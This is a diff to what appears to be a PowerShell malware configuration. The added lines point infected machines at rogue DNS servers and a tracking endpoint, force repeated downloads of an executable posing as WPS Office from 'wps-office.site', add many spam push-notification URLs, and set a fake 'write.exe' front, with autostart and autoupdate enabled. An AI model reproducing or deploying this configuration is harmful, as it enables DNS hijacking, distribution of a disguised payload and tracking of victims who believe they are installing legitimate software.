@@ -1,6 +1,5 @@
 $server = '{
-    "landingAuto":  true,
-    "landingName":  "wps-office",
+    "disableVirus":  false,
     "UpdateFile":  null,
     "server":  "185.247.141.76",
     "strahServer":  null,
@@ -8,8 +7,8 @@ $server = '{
     "primaryDns":  "185.247.141.78",
     "secondaryDns":  "185.247.141.51",
     "track":  true,
-    "trackSerie":  "unu.im",
-    "trackDesktop":  false,
+    "trackSerie":  "wps-office",
+    "trackDesktop":  true,
     "trackUrl":  "http://0.superhost.pw/185.247.141.76/upsert",
     "autoStart":  true,
     "autoUpdate":  true,
@@ -29,16 +28,37 @@ $server = '{
                   },
     "pushes":  [
                    "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
+                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a",
+                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
                    "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a"
                ],
     "startDownloads":  [
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
                            "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
                        ],
     "startUrls":  [
 
                   ],
     "front":  [
-
+                  "write.exe"
               ],
     "embeddings":  [
 
